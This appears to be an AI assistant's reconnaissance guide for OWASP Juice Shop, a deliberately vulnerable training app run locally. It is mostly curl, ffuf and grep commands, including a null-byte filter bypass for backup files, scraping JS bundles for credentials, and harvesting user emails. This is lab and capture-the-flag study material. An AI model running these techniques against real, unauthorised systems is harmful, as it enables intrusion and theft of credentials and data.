Here's a **comprehensive recon command set** mapped directly to the challenges you listed:

***
## Phase 1 — Quick Wins (30 seconds)
```bash
BASE="http://127.0.0.1:3000"

# Robots.txt → reveals /ftp (Confidential Document, Backup files)
curl -s $BASE/robots.txt

# FTP directory → goldmine of backup files
curl -s $BASE/ftp

# Metrics → Prometheus endpoint (Exposed Metrics challenge)
curl -s $BASE/metrics | head -50

# Score Board (hidden page)
curl -s $BASE/#/score-board

# Security policy (/.well-known)
curl -s $BASE/.well-known/security.txt
curl -s $BASE/.well-known/jwks.json
```

***
## Phase 2 — API Enumeration
```bash
# Full challenge list with statuses
curl -s $BASE/api/Challenges | python3 -m json.tool

# All REST API entities (triggers Error Handling on bare /api)
curl -s $BASE/api/
curl -s $BASE/api/Users
curl -s $BASE/api/Products
curl -s $BASE/api/Orders
curl -s $BASE/api/Feedbacks
curl -s $BASE/api/Complaints
curl -s $BASE/api/Recycles

# Vulnerable code snippets API
curl -s $BASE/snippets | python3 -m json.tool

# REST endpoints
curl -s $BASE/rest/user/whoami
curl -s $BASE/rest/products/search?q=
curl -s $BASE/rest/basket/1
curl -s $BASE/rest/languages
```

***
## Phase 3 — FTP Deep Dive (Backup/Sensitive files)
```bash
# List all FTP files
curl -s $BASE/ftp/

# Grab all known files
for f in acquisitions.md coupons_2013.md.bak eastere.gg incident-support.kdbx legal.md package.json.bak quarantine.mv secret.key suspicious_errors.yml; do
  echo "=== $f ===" && curl -s "$BASE/ftp/$f" | head -20
done

# Poison Null Byte bypass for .bak files (Forgotten Backup challenges)
curl -s "$BASE/ftp/package.json.bak%2500.md"
curl -s "$BASE/ftp/coupons_2013.md.bak%2500.md"
```

***
## Phase 4 — JS Analysis (Credentials, Routes, JWT)
```bash
# Find all JS bundles
curl -s $BASE | grep -oP 'src="[^"]+\.js"'

# Dump main bundle (contains hardcoded creds, routes, API keys)
curl -s $BASE/main.js -o main.js
curl -s $BASE/vendor.js -o vendor.js

# Search for sensitive strings
grep -Eo '"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]+"' main.js  # Emails
grep -i "password\|secret\|token\|apikey\|bearer\|B2B\|admin" main.js | head -30
grep -i "path.*:.*'" main.js | head -30  # Hidden routes

# Find ALL frontend routes (Score Board, Admin, Web3 sandbox)
grep -oP "path: '[^']+'" main.js
```

***
## Phase 5 — Directory Fuzzing (Targeted)
```bash
# Root level
ffuf -u $BASE/FUZZ -w /home/peburu/wordlists/recon/directories/raft-small-directories.txt \
  -fs 75002 -t 5 -rate 20 -timeout 10 -s

# API sub-paths (Christmas Special, NoSQL, Admin)
ffuf -u $BASE/api/FUZZ -w /home/peburu/wordlists/recon/directories/raft-small-words.txt \
  -fs 75002 -mc 200,301,500 -t 5 -rate 20 -s

# REST sub-paths
ffuf -u $BASE/rest/FUZZ -w /home/peburu/wordlists/recon/directories/raft-small-words.txt \
  -fs 75002 -mc 200,301,500 -t 5 -rate 20 -s

# FTP files (with extensions)
ffuf -u $BASE/ftp/FUZZ -w /home/peburu/wordlists/recon/directories/raft-small-files.txt \
  -mc 200,301 -t 5 -rate 10 -s
```

***
## Phase 6 — Tech Fingerprinting
```bash
# Headers (reveals Express, Node version, JWT usage)
curl -sI $BASE

# WhatWeb
whatweb $BASE -a 3

# Check socket.io (WebSocket challenges)
curl -s $BASE/socket.io/

# Check for B2B deprecated endpoint
curl -s $BASE/b2b/v2/orders
curl -s "$BASE/b2b/v2/"
```

***
## Phase 7 — OSINT (Password Reset Challenges)
```bash
# Photo wall images (Meta/Visual Geo Stalking)
curl -s $BASE/api/ImageCaptchas
curl -s "$BASE/rest/products/search?q=" | python3 -m json.tool | grep -i "photo\|image"

# Download photo wall images for EXIF analysis
curl -s $BASE/api/Users | python3 -m json.tool | grep -i "profile\|photo"

# Check photo metadata once downloaded
exiftool downloaded_photo.jpg
```

***
## Challenge→Recon Map
| Challenge | Key Recon Command |
|---|---|
| Score Board | `grep "score-board" main.js` |
| Exposed Metrics | `curl $BASE/metrics` |
| Confidential Document | `curl $BASE/ftp/acquisitions.md` |
| Forgotten Backups | `curl "$BASE/ftp/package.json.bak%2500.md"` |
| Exposed Credentials | `grep -i "password" main.js` |
| Admin Section | `grep "administration" main.js` |
| Error Handling | `curl $BASE/api/` (bare request) |
| Deprecated B2B | `curl $BASE/b2b/v2/orders` |
| Web3 Sandbox | `grep "web3\|sandbox\|contract" main.js` |
| XXE | `curl $BASE/ftp/` → find upload endpoints |
| Leaked API Key | `grep -i "apikey\|api_key" main.js` |
| Weird Crypto | `grep -i "md5\|des\|rc4\|sha1" main.js` |
| Access Log | `ffuf /support/FUZZ + /logs/FUZZ` |

***
## All-in-one recon script
```bash
#!/bin/bash
BASE="http://127.0.0.1:3000"
echo "=== ROBOTS ===" && curl -s $BASE/robots.txt
echo "=== FTP ===" && curl -s $BASE/ftp
echo "=== METRICS ===" && curl -s $BASE/metrics | head -20
echo "=== API BARE ===" && curl -s $BASE/api/ | head -5
echo "=== WELL-KNOWN ===" && curl -s $BASE/.well-known/security.txt
echo "=== ROUTES ===" && curl -s $BASE/main.js | grep -oP "path: '[^']+'" | sort -u
echo "=== EMAILS ===" && curl -s $BASE/main.js | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]+' | sort -u
echo "=== USERS ===" && curl -s $BASE/api/Users | python3 -m json.tool 2>/dev/null | grep -i "email\|username"
```

This covers **80%+ of the challenges** through pure recon before any exploitation. [help.owasp-juice](https://help.owasp-juice.shop/appendix/solutions.html)
